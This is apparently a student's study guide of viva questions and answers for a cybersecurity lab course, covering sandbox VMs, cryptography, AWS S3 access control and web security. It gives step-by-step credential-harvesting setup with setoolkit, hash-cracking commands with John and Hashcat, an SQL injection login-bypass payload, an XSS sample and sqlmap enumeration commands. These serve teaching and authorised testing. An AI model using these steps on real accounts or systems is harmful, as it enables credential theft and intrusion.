# Cybersecurity Lab Viva & Lab-Record Study Guide

---

# Module 1: Introduction to Cyber Security & Threats

## Topics Covered

### Virtualization & Sandbox Setup
Virtualization allows a single physical computer (host) to run multiple isolated virtual machines (guests) simultaneously using a software layer called a hypervisor, such as Oracle VirtualBox or VMware Workstation. In cybersecurity, setting up a sandbox environment is critical because it provides a safe, isolated network where students and professionals can deploy offensive distributions like Kali Linux alongside intentionally vulnerable targets like Metasploitable 2 or OWASP Juice Shop. By configuring virtual networking modes—such as NAT, Host-Only, or Internal Networks—security testers can execute live exploits, analyze network traffic, and test malware without risking accidental damage or unauthorized traffic leakage onto production networks or the public internet. Mastering VM deployment, virtual disk formats (`.vdi`, `.vmdk`), and default administrative credentials (`kali/kali`, `msfadmin/msfadmin`) forms the foundational step of any ethical hacking laboratory.

### Social Engineering
Social engineering is the psychological manipulation of individuals into performing actions or divulging confidential information, bypassing technical security controls by exploiting human trust rather than software vulnerabilities. The Social-Engineer Toolkit (`setoolkit`), developed by TrustedSec and pre-installed on Kali Linux, is an open-source framework designed to simulate these attacks during authorized penetration tests. One of its most common modules is the Credential Harvester attack vector, which clones a legitimate login page (using pre-built web templates or custom site cloner options) and hosts it on the attacker's local HTTP server. When an unsuspecting user submits their username and password into the cloned form, `setoolkit` captures the POST request parameters in plaintext on the terminal and redirects the victim back to the genuine website, highlighting why organizations must invest heavily in phishing awareness and multi-factor authentication.

---

## Experiment 1: Virtual Cyber Security Laboratory Environment

**1. What was the main objective of this experiment, and what tools/VMs did you install?**
The main objective (aim) of this experiment was to install and configure a virtual cyber security laboratory environment to perform cybersecurity experiments, vulnerability assessments, and penetration testing safely without affecting the host system. According to the lab record, the virtualization tool used was **Oracle VirtualBox** (running on an Ubuntu Linux host machine, `apsit-HP-Pro-Tower-280-G9-PCI-Desktop-PC`). Within VirtualBox, we installed and configured the following virtual machines:
1. **Kali Linux** (`kali-linux-2026.2-virtualbox-amd64` with `kali-linux-2026.2-virtualbox-amd64.vdi`, 80.09 GB virtual size) as the offensive security environment.
2. **Metasploitable 2** (`Metasploitable.vmdk`, 8.00 GB virtual size, downloaded from `rapid7.com` and `sourceforge.net/projects/metasploitable/`) as the vulnerable target machine.
3. **Bee-Box** (`bee-box.vmdk`, 20.00 GB virtual size) was also present in the VirtualBox Manager.

**2. How did you set up Kali Linux and Metasploitable in VirtualBox step-by-step?**
Based on the lab document, we performed the following steps:
1. **Configure VirtualBox Services on Host:** Opened the host terminal, elevated privileges using `sudo su`, and ran `/sbin/vboxconfig` to stop/start VirtualBox services and build the VirtualBox kernel modules (`vboxdrv.sh`).
2. **Deploy Kali Linux VM:** Added the pre-configured Kali Rolling (2026.2) x64 virtual disk (`kali-linux-2026.2-virtualbox-amd64.vdi`) in Oracle VirtualBox with OS set to `Debian (64-bit)`, Base Memory `2048 MB`, Processors `2`, Graphics Controller `VMSVGA` (128 MB video memory), and Network Adapter 1 set to `Intel PRO/1000 MT Desktop (NAT)`.
3. **Boot and Log into Kali Linux:** Started the Kali Linux VM and logged in using the default username `kali` and password `kali`.
4. **Download & Extract Metasploitable:** Downloaded the Metasploitable zip archive (`metasploitable-linux-2.0.0.zip`) from `rapid7.com/products/metasploit/metasploitable/` (or `https://sourceforge.net/projects/metasploitable/`) and extracted the folder `Metasploitable2-Linux` containing `Metasploitable.vmdk`.
5. **Create Metasploitable VM in VirtualBox:** Clicked **New** in Oracle VirtualBox Manager, entered the VM Name (`Metasploit` / `Metasploitable`), selected OS as `Linux`, OS Distribution as `Debian` (or `Ubuntu`), and Version as `Debian (32-bit)` / `Ubuntu (32-bit)`.
6. **Specify Virtual Hardware & Hard Disk:** Allocated Base Memory (`3662 MB` / `4096 MB` / `2048 MB`) and CPUs (`4` / `3`). Under **Specify virtual hard disk**, selected **Use an Existing Virtual Hard Disk File**, clicked the folder icon, clicked **Add** in the Hard Disk Selector, selected `Metasploitable.vmdk` (8.00 GB), and clicked **Choose** and **Finish**.
7. **Boot Metasploitable:** Started the VM and logged into the terminal using `msfadmin` for both login ID and password.

**3. Why is it necessary to conduct security testing inside an isolated virtual sandbox environment?**
As stated in our lab theory, conducting security testing inside a virtual sandbox environment is necessary because it provides a **secure, controlled, and isolated platform** where vulnerability assessments, penetration testing, malware analysis, and digital forensics can be executed without affecting the underlying host operating system or live production networks. Target machines like Metasploitable are intentionally configured with dozens of critical vulnerabilities and backdoors; exposing them to an untrusted or public network (as warned on the Metasploitable login banner: *"Warning: Never expose this VM to an untrusted network!"*) would allow real-world attackers to compromise the system immediately. Furthermore, offensive scans, DoS simulations, and exploit payloads generated during lab exercises can crash services or violate cyber laws if accidentally directed at external IP addresses. Virtualization ensures all attack and defense simulations remain completely risk-free, repeatable, and cost-effective.

**4. What are the default login credentials for Kali Linux and Metasploitable virtual machines?**
According to the screenshots and instructions recorded in Experiment 1:
* **Kali Linux (`kali-linux-2026.2-virtualbox-amd64`):**
  * **Username:** `kali`
  * **Password:** `kali`
* **Metasploitable 2 (`metasploitable`):**
  * **Username (Login ID):** `msfadmin`
  * **Password:** `msfadmin`

---

## Experiment 2: Social Engineering Attack Simulation (SET Toolkit)

**1. What was the main objective of this experiment, and what attack vector did you simulate?**
The main objective (aim) of this experiment was to simulate social engineering attacks using the Social-Engineer Toolkit (SET) in a controlled Kali Linux environment. During the experiment, we simulated a phishing-based credential harvesting attack by selecting the **Social-Engineering Attacks** menu, choosing the **Website Attack Vectors** module, and executing the **Credential Harvester Attack Method** using pre-defined **Web Templates**.

**2. How did you configure and execute the Credential Harvester attack using setoolkit in Kali Linux?**
According to our Experiment 2 lab record, we configured and executed the attack using the following step-by-step procedure:
1. Opened the terminal in Kali Linux and launched the Social-Engineer Toolkit with root privileges by running:
   ```bash
   sudo setoolkit
   ```
2. Selected option `1` for **Social-Engineering Attacks** from the main menu.
3. Selected the **Website Attack Vectors** option from the sub-menu.
4. Selected the **Credential Harvester Attack Method** option.
5. Selected the **Web Templates** option to use a pre-built login page template.
6. Checked and verified our Kali Linux machine's local IP address in another terminal using the command:
   ```bash
   ifconfig
   ```
7. Provided the local IP address for the POST back in `setoolkit` and selected the desired web template to start the local cloning server.
8. Opened the **Firefox** web browser inside the Kali Linux machine itself and entered our Kali machine's IP address as the URL.
9. Entered test login credentials consisting of an **email and password** into the cloned login page and clicked **Sign in**.

**3. What output is captured on the terminal when a victim enters their login details on the cloned page?**
In our lab experiment, when the victim enters their credentials consisting of their **email and password** on the hosted web template and clicks on **Sign in**, those exact plaintext credentials are immediately intercepted via an HTTP POST request and **recorded directly on the active `setoolkit` terminal window**, while the victim's browser is allowed to successfully access/redirect to the web template after signing in. Specifically, `setoolkit` displays a terminal alert showing the source IP address of the victim and prints the captured HTML form fields (such as `POSSIBLE USERNAME FIELD FOUND` and `POSSIBLE PASSWORD FIELD FOUND` along with the exact email and password strings entered), and saves a copy of the report under `/var/www/html/` or `/root/.set/reports/`.

**4. What security controls can organizations implement to prevent credential harvesting attacks?**
*[Not found in lab docs - add manually]*
Organizations can implement a multi-layered defense strategy combining technical and administrative controls to prevent credential harvesting attacks:
1. **Phishing-Resistant Multi-Factor Authentication (MFA):** Enforce FIDO2/WebAuthn hardware security keys or authenticator apps so that even if an attacker harvests a user's plaintext password via `setoolkit`, they cannot complete the login without the second factor.
2. **Security Awareness Training & Phishing Simulations:** Train employees to inspect URLs carefully (e.g., spotting raw IP addresses like `http://192.168.x.x` or typosquatted domains) and verify SSL/TLS HTTPS certificates before entering credentials.
3. **Email & Web Filtering Gateways:** Deploy Secure Email Gateways (SEGs) with SPF, DKIM, and DMARC authentication, alongside DNS filters and web proxies (like Squid) to block access to newly registered or uncategorized IP-based phishing hosts.
4. **Password Managers:** Encourage the use of browser-integrated password managers, which refuse to auto-fill credentials if the current page's domain does not exactly match the stored legitimate domain.

---

# Module 2: Cryptography & Secure Communication

## Topics Covered

### Classical & Modern Ciphers
Cryptography secures communication by transforming readable plaintext into unintelligible ciphertext using mathematical algorithms and keys. Classical ciphers, such as the **Vigenère cipher**, rely on polyalphabetic substitution where a repeating keyword shifts plaintext letters across a $26 \times 26$ Vigenère square; however, they are easily broken using frequency analysis and Kasiski examination once the keyword length is deduced. Modern symmetric cryptography utilizes block ciphers like **DES (Data Encryption Standard)**, which encrypts 64-bit blocks across a 16-round Feistel network using a 56-bit effective key, and **AES (Advanced Encryption Standard)**, a non-Feistel substitution-permutation network operating on 128-bit blocks with 128-, 192-, or 256-bit keys. For secure key exchange and digital signatures without a pre-shared secret, asymmetric cryptography employs the **RSA algorithm**, which relies on the computational difficulty of factoring the product of two large prime numbers ($n = p \times q$) using a public key $(e, n)$ for encryption and a private key $(d, n)$ for decryption.

### Cryptanalysis Tools
Cryptanalysis is the science of analyzing information systems to study hidden aspects of ciphers and recover plaintext without prior knowledge of the secret key. **CrypTool 1.4** is an open-source educational e-learning software used extensively to visualize and evaluate both classical and modern cryptographic algorithms, while **OpenSSL** provides a robust command-line toolkit for production-grade encryption, hashing, and certificate management. Inside CrypTool, users can execute complete encryption and decryption workflows, generate histograms, calculate entropy, and launch automated cryptanalysis attacks—such as ciphertext-only frequency analysis on Caesar/Vigenère ciphers or brute-force key searches on weakened RC4/DES keys. Visualizing these workflows helps security analysts understand why short key lengths and statistical plaintext patterns lead to cryptographic failure.

---

## Experiment 3: Cryptography & Cryptanalysis (CrypTool / OpenSSL)

**1. What was the aim of this experiment, and what software did you use to evaluate cryptographic algorithms?**
In our lab software requirements, the cryptography and cryptanalysis tools specified are **CrypTool** and **OpenSSL**.
*[Not found in lab docs - add manually]*
The aim of this experiment was to study and implement classical and modern cryptographic algorithms (such as Vigenère, DES, AES, and RSA) and perform encryption, decryption, and cryptanalysis operations using **CrypTool 1.4** (and **OpenSSL**). Using CrypTool, we evaluated symmetric and asymmetric encryption workflows and analyzed how weak keys or classical substitution ciphers can be broken using built-in cryptanalysis modules.

**2. How did you perform encryption, decryption, and cryptanalysis operations inside CrypTool?**
*[Not found in lab docs - add manually]*
To perform encryption, decryption, and cryptanalysis inside **CrypTool 1.4**, we followed these steps:
1. **Input Plaintext:** Opened CrypTool 1.4 and created a new text document (`File > New`) or used the default sample plaintext window.
2. **Encryption:** Navigated to the **Encrypt/Decrypt** menu on the top toolbar:
   * Selected **Symmetric (classic) > Vigenère**, entered an alphabetic key (e.g., `KEY`), and clicked **Encrypt** to generate the polyalphabetic ciphertext.
   * Selected **Symmetric (modern) > DES (ECB/CBC)** or **AES**, entered a hexadecimal key (e.g., `16` hex digits for 64-bit DES or `32` hex digits for 128-bit AES), and clicked **Encrypt** to view the hexadecimal ciphertext output.
   * Selected **Asymmetric > RSA Demonstration**, generated prime numbers $p$ and $q$, computed modulus $N$ and public/private keys, and encrypted the message.
3. **Decryption:** Highlighted the generated ciphertext window, returned to the same algorithm under **Encrypt/Decrypt**, entered the exact same symmetric key (or RSA private key), and clicked **Decrypt** to verify that the original plaintext was restored.
4. **Cryptanalysis:** With a ciphertext window active, navigated to **Analysis > Symmetric Encryption (classic) > Ciphertext-Only > Vigenère** (or **Analysis > Symmetric Encryption (modern) > DES** for brute-force demonstration), where CrypTool automatically determined the key length via Friedman/Kasiski tests and recovered the secret key and plaintext.

**3. How does the effective key length and 16-round Feistel structure of DES compare to AES?**
*[Not found in lab docs - add manually]*
DES (Data Encryption Standard) and AES (Advanced Encryption Standard) differ fundamentally in their internal round architecture, block size, and resistance to brute-force attacks:

| Feature | DES (Data Encryption Standard) | AES (Advanced Encryption Standard) |
| :--- | :--- | :--- |
| **Cipher Structure** | **Feistel Network:** Splits the 64-bit block into two 32-bit halves ($L_i$ and $R_i$); only one half is transformed per round using the round function $F$ and XORed with the other half. | **Substitution-Permutation Network (SPN):** Encrypts the entire 128-bit block simultaneously as a $4 \times 4$ byte state matrix in every round. |
| **Block Size** | 64 bits (8 bytes) | 128 bits (16 bytes) |
| **Effective Key Length** | **56 bits** (out of a 64-bit key, 8 bits are used for parity checking), yielding $2^{56}$ possible keys. | **128, 192, or 256 bits**, yielding $2^{128}$, $2^{192}$, or $2^{256}$ possible keys. |
| **Number of Rounds** | **16 rounds** of identical Feistel operations. | **10 rounds** (128-bit key), **12 rounds** (192-bit key), or **14 rounds** (256-bit key). |
| **Round Operations** | Expansion Permutation, Key Mixing (XOR), 8 S-Boxes, and P-Box Permutation. | `SubBytes`, `ShiftRows`, `MixColumns` (omitted in final round), and `AddRoundKey`. |
| **Security Status** | **Insecure / Deprecated:** 56-bit keyspace can be brute-forced in hours using modern hardware. | **Secure / Global Standard:** Immune to practical brute-force attacks. |

**4. What are the main steps involved in RSA key generation, encryption, and decryption?**
*[Not found in lab docs - add manually]*
RSA is an asymmetric public-key cryptosystem whose security relies on the mathematical difficulty of factoring large composite integers. It operates in three main phases:
1. **Key Generation:**
   * Choose two distinct large prime numbers $p$ and $q$.
   * Compute the modulus $n = p \times q$, which determines the key length.
   * Compute Euler's totient function:
     $$\phi(n) = (p - 1)(q - 1)$$
   * Choose an integer public exponent $e$ such that $1 < e < \phi(n)$ and $\gcd(e, \phi(n)) = 1$ (meaning $e$ and $\phi(n)$ are coprime).
   * Compute the private exponent $d$ as the modular multiplicative inverse of $e$ modulo $\phi(n)$:
     $$d \cdot e \equiv 1 \pmod{\phi(n)}$$
   * **Public Key:** $(e, n)$ is shared openly; **Private Key:** $(d, n)$ is kept secret.
2. **Encryption:** To encrypt an integer plaintext message $M$ (where $0 \le M < n$), the sender uses the recipient's public key $(e, n)$ to compute ciphertext $C$:
   $$C = M^e \pmod n$$
3. **Decryption:** To recover the plaintext message $M$, the recipient uses their private key $(d, n)$ to compute:
   $$M = C^d \pmod n$$

---

# Module 3: System Security & Cloud Security

## Topics Covered

### Cloud Access Control
Cloud storage services like **Amazon Simple Storage Service (AWS S3)** store massive volumes of enterprise data inside logical containers called buckets. Securing S3 buckets requires a multi-layered access control approach combining **S3 Block Public Access** settings (which override accidental public ACLs or policies), identity-based **IAM Policies**, and resource-based **S3 Bucket Policies** written in JSON. For high-risk or destructive operations—such as permanently deleting objects (`s3:DeleteObject`) or changing bucket versioning—administrators enforce **Multi-Factor Authentication (MFA)** at the API level. By adding a JSON condition block checking `"aws:MultiFactorAuthPresent": "false"` paired with an explicit `"Effect": "Deny"`, AWS guarantees that even if an IAM user's access keys are compromised, an attacker cannot delete critical cloud backups without providing a valid hardware or virtual MFA token.

### Identity Management
Identity and Access Management (IAM) governs how users and services authenticate and what resources they are authorized to access. **Role-Based Access Control (RBAC)** assigns permissions to specific job functions or roles (such as `S3-ReadOnly-Auditor` or `Database-Admin`) rather than individual users, enforcing the Principle of Least Privilege across enterprise cloud environments. In contrast, **Discretionary Access Control (DAC)** allows the owner of a resource (such as a file creator in Linux or an S3 object owner using legacy ACLs) to pass permissions to other users at their own discretion, which often leads to overly permissive access sprawl. Implementing strict **read-only permission boundaries** ensures that standard users can list and download objects (`s3:GetObject`, `s3:ListBucket`) while explicitly restricting write or delete actions (`s3:PutObject`, `s3:DeleteObject`).

### Password Security
Password security relies on high **entropy** (randomness measured in bits based on character set size and length) and strong cryptographic storage. Tools like `pwscore` (from the `libpwquality` package) evaluate password strength against dictionary words, palindromes, and character complexity, returning a score from `0` to `100`. When attackers obtain password hash dumps (such as `/etc/shadow` or database leaks), they use offline cracking utilities like **John the Ripper (`john`)** and GPU-accelerated **Hashcat (`hashcat`)**. These tools compare pre-computed hashes from massive wordlists like `/usr/share/wordlists/rockyou.txt` against target hashes, and apply **rule-based mutations** (such as `best64.rule`, which appends numbers, capitalizes letters, or substitutes `@` for `a`) to crack complex human-chosen passwords.

---

## Experiment 4: Cloud Access Control & MFA (AWS S3)

**1. What did you implement in this experiment, and what cloud environment did you configure?**
*[Not found in lab docs - add manually]*
In this experiment, we configured cloud storage security and access controls inside the **Amazon Web Services (AWS)** cloud environment using **AWS S3 (Simple Storage Service)** and **AWS IAM (Identity and Access Management)**. Specifically, we created an isolated S3 bucket with **Block Public Access** enabled, configured an IAM user with programmatic and console access, enabled a virtual **Multi-Factor Authentication (MFA)** device, and implemented a custom JSON S3 Bucket Policy to enforce MFA verification before allowing destructive API calls such as `s3:DeleteObject`.

**2. How did you set up IAM policies and enforce Multi-Factor Authentication (MFA) for S3 bucket access?**
*[Not found in lab docs - add manually]*
We configured IAM policies and enforced MFA for S3 bucket access using the following step-by-step workflow:
1. **Create an S3 Bucket:** Logged into the AWS Management Console, navigated to **S3**, clicked **Create bucket**, assigned a unique bucket name, and verified that **Block all public access** was checked.
2. **Create an IAM User & Attach Policy:** Navigated to **IAM > Users > Create user**, created a test user, and attached the `AmazonS3FullAccess` (or custom S3 access) managed policy so the user could interact with the bucket.
3. **Configure Virtual MFA:** Selected the IAM user, went to the **Security credentials** tab, clicked **Assign MFA device** under Multi-factor authentication, selected **Authenticator app**, scanned the QR code using Google Authenticator/Authy, and entered two consecutive 6-digit TOTP codes to activate MFA.
4. **Apply MFA-Enforcing Bucket Policy:** Navigated to **S3 > [Bucket Name] > Permissions > Bucket policy**, clicked **Edit**, and pasted a JSON policy containing a `Deny` statement for `s3:DeleteObject` whenever `aws:MultiFactorAuthPresent` is `false`.
5. **Verify Enforcement:** Tested deleting an object via temporary STS credentials obtained with `aws sts get-session-token --serial-number <arn-of-mfa> --token-code <code-from-app>` versus standard unauthenticated/non-MFA sessions.

**3. How is an AWS S3 bucket policy written to deny object deletion if MFA is absent?**
*[Not found in lab docs - add manually]*
To prevent any user from deleting objects in an S3 bucket unless they have authenticated with Multi-Factor Authentication (MFA), an administrator attaches a resource-based JSON bucket policy using an explicit `"Effect": "Deny"` and a `Bool` condition checking `"aws:MultiFactorAuthPresent": "false"`:

```json
{
  "Version": "2012-10-17",
  "Id": "RequireMFAForObjectDeletion",
  "Statement": [
    {
      "Sid": "DenyDeleteObjectWithoutMFA",
      "Effect": "Deny",
      "Principal": "*",
      "Action": "s3:DeleteObject",
      "Resource": "arn:aws:s3:::my-lab-secure-bucket/*",
      "Condition": {
        "BoolIfExists": {
          "aws:MultiFactorAuthPresent": "false"
        }
      }
    }
  ]
}
```
Because an explicit `Deny` in AWS always overrides any `Allow` permission granted by an IAM policy, any API call to `s3:DeleteObject` lacking a valid MFA-authenticated session token is immediately rejected with an `AccessDenied` error.

**4. What is the AWS Shared Responsibility Model regarding cloud storage security?**
*[Not found in lab docs - add manually]*
The **AWS Shared Responsibility Model** defines the division of security duties between Amazon Web Services (the cloud provider) and the customer to ensure complete cloud security:
* **AWS Responsibility ("Security OF the Cloud"):** AWS is responsible for protecting the underlying global infrastructure that runs all AWS services. For S3, this includes the physical security of data centers, hardware storage drives, host operating systems, virtualization layers, network infrastructure, and automatic data durability/replication across Availability Zones.
* **Customer Responsibility ("Security IN the Cloud"):** The customer is responsible for securing the data they store inside S3 and how they configure the service. This includes configuring **S3 Block Public Access**, writing least-privilege **IAM and Bucket Policies**, enabling **Server-Side Encryption (SSE-S3 / SSE-KMS)** and **HTTPS-only (`aws:SecureTransport`)** transit, enabling **S3 Versioning** and **MFA Delete**, and monitoring access logs via AWS CloudTrail.

---

## Experiment 5: Cloud Storage Identity & Access Control

**1. What was the aim of this experiment, and how did you establish user permission boundaries?**
*[Not found in lab docs - add manually]*
The aim of this experiment was to implement **Role-Based Access Control (RBAC)** and enforce strict **read-only permission boundaries** for cloud storage users in AWS S3. We established user permission boundaries by creating a dedicated IAM user/role and attaching a custom least-privilege JSON IAM policy (or `AmazonS3ReadOnlyAccess`) that explicitly allowed only read and list operations (`s3:GetObject` and `s3:ListBucket`) on our target S3 bucket ARN, while omitting or explicitly denying write and destructive actions (`s3:PutObject` and `s3:DeleteObject`).

**2. How did you verify allowed (download) versus restricted (upload/delete) actions in the AWS Console and AWS CLI?**
*[Not found in lab docs - add manually]*
We verified the read-only permission boundaries through both the AWS Management Console and the AWS CLI using the following steps:
1. **Configure AWS CLI Profile:** Configured the read-only IAM user's credentials on the terminal using:
   ```bash
   aws configure --profile readonly-user
   ```
2. **Verify Allowed Actions (List & Download):**
   * Listed the bucket contents successfully:
     ```bash
     aws s3 ls s3://my-lab-secure-bucket/ --profile readonly-user
     ```
   * Downloaded (`s3:GetObject`) a sample file (`sample.txt`) from the bucket without error:
     ```bash
     aws s3 cp s3://my-lab-secure-bucket/sample.txt ./sample.txt --profile readonly-user
     ```
3. **Verify Restricted Actions (Upload & Delete):**
   * Attempted to upload (`s3:PutObject`) a new file (`test.txt`) to the bucket:
     ```bash
     aws s3 cp test.txt s3://my-lab-secure-bucket/ --profile readonly-user
     ```
     **Output:** `upload failed: ./test.txt to s3://my-lab-secure-bucket/test.txt An error occurred (AccessDenied) when calling the PutObject operation: Access Denied`.
   * Attempted to delete (`s3:DeleteObject`) the existing file in the AWS Console and via CLI:
     ```bash
     aws s3 rm s3://my-lab-secure-bucket/sample.txt --profile readonly-user
     ```
     **Output:** `delete failed: s3://my-lab-secure-bucket/sample.txt An error occurred (AccessDenied) when calling the DeleteObject operation: Access Denied`.

**3. How do IAM user policies and S3 bucket policies evaluate whether an access request is allowed or denied?**
*[Not found in lab docs - add manually]*
When an IAM principal makes an request to an AWS S3 bucket within the same AWS account, the AWS policy evaluation engine combines both **Identity-Based IAM Policies** and **Resource-Based S3 Bucket Policies** using a strict sequential logic:
1. **Default Deny:** By default, all requests are implicitly **Denied**.
2. **Explicit Deny Check:** AWS evaluates all applicable policies (IAM policies, S3 bucket policies, permissions boundaries, and Service Control Policies). If **any** policy contains an explicit `"Effect": "Deny"` matching the request, the evaluation stops immediately and results in **Final Deny** (`AccessDenied`).
3. **Permission Boundary Check:** If a permission boundary is attached to the IAM user/role, the requested action must be allowed by *both* the boundary and the identity policy.
4. **Explicit Allow Check:** For same-account access, if there is no explicit `Deny`, the request is **Allowed** if *either* the IAM user policy *or* the S3 bucket policy grants an explicit `"Effect": "Allow"` for that action and resource.
5. **Final Implicit Deny:** If neither policy contains an explicit `Allow`, the request falls back to the default **Implicit Deny**.

---

## Experiment 6: Password Strength Testing & Password Cracking

**1. What was the main purpose of this experiment, and what tools did you use on Kali Linux?**
*[Not found in lab docs - add manually]*
The main purpose of this experiment was to evaluate password complexity and entropy against offline password-cracking techniques in Kali Linux, demonstrating why weak or predictable passwords fail to protect user accounts. On Kali Linux, we used three primary tools:
1. **`pwscore` (`libpwquality-tools`):** Command-line utility used to measure password quality and entropy scores (`0–100`) and reject dictionary-based passwords.
2. **John the Ripper (`john`):** Fast CPU-based offline password cracker used to perform default dictionary attacks (`rockyou.txt`) against sample MD5 hashes.
3. **Hashcat (`hashcat`):** Advanced password recovery tool used to perform dictionary attacks combined with rule-based mutation files (`best64.rule`) to crack complex passwords.

**2. How did you evaluate password strength using pwscore and crack sample MD5 hashes with John the Ripper and Hashcat?**
*[Not found in lab docs - add manually]*
We executed the password auditing workflow on Kali Linux using these numbered steps:
1. **Evaluate Password Entropy with `pwscore`:** Piped weak and strong candidate passwords into `pwscore` on the terminal:
   ```bash
   echo "password123" | pwscore
   echo "Tr0ub4dour&3#99!" | pwscore
   ```
   Weak passwords failed with a dictionary/palindrome error, whereas complex passwords returned a numerical quality score between `0` and `100`.
2. **Generate Sample MD5 Hashes:** Created a text file `hashes.txt` containing sample MD5 hashes generated via `echo -n "welcome123" | md5sum` and a complex mutated password hash.
3. **Crack Hashes with John the Ripper:** Ran a dictionary attack against `hashes.txt` specifying the raw MD5 format and the `rockyou.txt` wordlist:
   ```bash
   john --format=raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
   john --show --format=raw-MD5 hashes.txt
   ```
4. **Crack Complex Hashes with Hashcat (Rule-Based Attack):** Used Hashcat mode `-m 0` (MD5) and attack mode `-a 0` (straight dictionary) combined with the `best64.rule` mutation rule file (`-r`):
   ```bash
   hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
   ```

**3. Why did Hashcat succeed in recovering complex passwords that default dictionary attacks in John the Ripper missed?**
*[Not found in lab docs - add manually]*
A standard dictionary attack in John the Ripper (`--wordlist=rockyou.txt`) only tests exact, static strings present inside the wordlist file line-by-line. If a user creates a password by taking a base dictionary word and applying human-predictable modifications—such as capitalizing the first letter, substituting symbols (`@` for `a`, `$` for `s`), reversing the word, or appending a year/special character at the end (e.g., `Spring2026!`)—a pure dictionary lookup will miss it if that exact variation is not in `rockyou.txt`. **Hashcat** succeeded because we enabled **rule-based mutations (`-r best64.rule`)**, which dynamically applies dozens of programmatic transformations (appending digits, toggling case, leetspeak substitutions, and duplicating characters) to every base word in `rockyou.txt` on the fly, effectively amplifying a 14-million-word dictionary into nearly a billion targeted candidate guesses.

**4. Why are salted, slow hashing functions (bcrypt, Argon2) superior to fast hashes like MD5/SHA1 for storing passwords?**
*[Not found in lab docs - add manually]*
Fast cryptographic hash functions like **MD5** and **SHA-1** were designed for rapid file integrity verification, not password storage. Because they require minimal CPU computation, modern GPUs can calculate billions of MD5 or SHA-1 hashes per second, and attackers can use pre-computed **Rainbow Tables** to reverse unsalted hashes instantly. In contrast, modern password hashing functions like **bcrypt** and **Argon2** (winner of the Password Hashing Competition) are superior for three reasons:
1. **Cryptographic Salting:** They automatically generate a unique, random **salt** (`128-bit`) for every single password before hashing. This ensures that two users with the identical password have completely different hashes and renders pre-computed Rainbow Tables useless.
2. **Configurable Work Factor (Key Stretching):** `bcrypt` and `Argon2` are intentionally slow, requiring thousands of iterative rounds (`cost factor`) so a single hash takes ~100–500 milliseconds to compute, drastically throttling brute-force speeds.
3. **Memory-Hardness (Argon2):** Argon2 requires significant RAM allocation per hash computation, neutralizing parallel GPU and ASIC cracking hardware advantages.

---

# Module 4: Web Application Security

## Topics Covered

### Web Security Testing
Web applications are prime targets for cyber attacks because they are publicly accessible and directly interface with backend databases. The **OWASP Top 10** is the industry-standard awareness document outlining the most critical web application security risks, such as Broken Access Control and Injection. Security professionals practice identifying these flaws using **OWASP Juice Shop** (an intentionally insecure modern web application built on Node.js, Express, and Angular) and **OWASP ZAP (Zed Attack Proxy)**. OWASP ZAP functions as an intercepting proxy and automated vulnerability scanner offering three primary discovery modes: **Spidering** (crawling hyperlinks and forms to map the application's attack surface), **Passive Scanning** (harmlessly inspecting HTTP request/response headers, cookies, and info leaks without modifying traffic), and **Active Scanning** (injecting malicious attack payloads to actively probe for vulnerabilities like SQLi and XSS).

### Exploitation Concepts
Web exploitation targets improper input validation and broken authorization logic. **SQL Injection (SQLi)** occurs when untrusted user input is concatenated directly into a backend database query; entering an authentication bypass payload like `' OR 1=1--` forces the SQL `WHERE` clause to evaluate to `TRUE` and comments out the password check. In **Blind SQL Injection**, the application does not return database errors on screen, requiring automated tools like **`sqlmap`** to infer data byte-by-byte using boolean responses or time delays (`--dbs`, `--tables`, `--columns`, `--dump`). **Cross-Site Scripting (XSS)** injects malicious JavaScript (e.g., `<script>alert(1)</script>`) into web pages viewed by other users to steal session cookies, while **Insecure Direct Object References (IDOR)** allow an authenticated user to access unauthorized records simply by incrementing an object identifier (e.g., changing `?user_id=102` to `?user_id=101`) in the URL or API request.

### Web Access Control
Organizations control, filter, and monitor outbound employee web traffic using forward caching proxy servers like **Squid Proxy**. Configured via `/etc/squid/squid.conf` (listening by default on TCP port `3128`), Squid utilizes **Access Control Lists (ACLs)** (`acl`) to classify traffic based on source IP subnets (`src`), destination domains (`dstdomain`), URL regular expressions (`url_regex`), ports, or time of day, and enforces permissions sequentially through `http_access allow` or `http_access deny` directives. To ensure accountability before granting internet access, administrators integrate `basic_ncsa_auth` with an encrypted password file created via the Apache **`htpasswd`** utility. Every client HTTP/HTTPS request processed by Squid is recorded in `/var/log/squid/access.log`, capturing timestamps, client IPs, Squid result codes (`TCP_DENIED/403`, `TCP_MISS/200`), and requested URLs for security auditing.

---

## Experiment 7: Web Vulnerability Scanning & SQLi (OWASP ZAP & Juice Shop)

**1. What was the objective of this experiment, and what target application did you scan and test?**
In our attached lab document fragments, we performed database enumeration and SQL Injection testing against a vulnerable web application containing the **`acuart`** database (with 8 tables including the `users` table and `uname` column, which is the standard backend database of Acunetix `testphp.vulnweb.com`). In the module syllabus, the target application is **OWASP Juice Shop** scanned with **OWASP ZAP** (along with **Bee-Box** also installed in our VirtualBox environment in Experiment 1).
*[Not found in lab docs - add manually]*
The objective of this experiment was to perform automated web application vulnerability scanning using **OWASP ZAP** and execute manual and automated **SQL Injection (SQLi)** attacks (against **OWASP Juice Shop** and the **`acuart`** web application database) to identify security flaws, bypass authentication, and enumerate backend database tables and user credentials.

**2. How did you use OWASP ZAP and manual SQL Injection payloads to assess application security?**
Based on our attached lab document steps for SQL Injection enumeration and standard OWASP ZAP testing:
1. **Automated Scanning with OWASP ZAP:** *[Not found in lab docs - add manually]* Launched OWASP ZAP, entered the target web application URL (e.g., OWASP Juice Shop `http://localhost:3000`) into the **Quick Start > Automated Scan** URL bar, ran the **Spider** to crawl all endpoints, and executed the **Active Scan** to flag SQL Injection, XSS, and missing security header alerts.
2. **Manual SQLi Authentication Bypass:** *[Not found in lab docs - add manually]* Navigated to the application login page and entered the payload `' OR 1=1--` into the email/username field with an arbitrary password to bypass authentication and log in as the administrator.
3. **Database Enumeration Steps (from our attached lab record):**
   * **Step 1 (List existing databases):** Enumerated the backend database management system to list information about the existing databases (using `sqlmap -u "<target-URL>" --dbs`), identifying the target database **`acuart`**.
   * **Step 2 (List tables in the database):** Queried the tables present inside the `acuart` database (`sqlmap -u "<target-URL>" -D acuart --tables`). As recorded in our lab observation: *"we see that 8 tables have been retrieved. So now we definitely know that the website is vulnerable."*
   * **Step 3 (Find columns in the `users` table):** Selected the **`users`** table from the retrieved tables and enumerated its columns (`sqlmap -u "<target-URL>" -D acuart -T users --columns`), identifying the username column **`uname`**.
